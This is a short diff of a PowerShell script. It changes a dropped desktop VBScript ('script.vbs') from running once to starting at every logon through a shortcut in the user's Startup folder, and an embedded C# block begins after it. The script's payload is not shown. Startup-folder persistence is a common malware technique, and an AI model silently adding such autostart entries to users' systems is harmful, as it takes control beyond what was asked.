@@ -63,9 +63,15 @@ Loop
 $vbsFilePath = [System.IO.Path]::Combine($desktopPath, "script.vbs")
 $vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
 
-# Run the VBScript file
+# Get the user's Startup folder
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+# Create a shortcut to the VBScript file in the Startup folder
+$shortcutPath = [System.IO.Path]::Combine($startupFolder, "script.lnk")
 $WshShell = New-Object -ComObject WScript.Shell
-$WshShell.Run($vbsFilePath)
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $vbsFilePath
+$shortcut.Save()
 
 $source = @"
 using System;
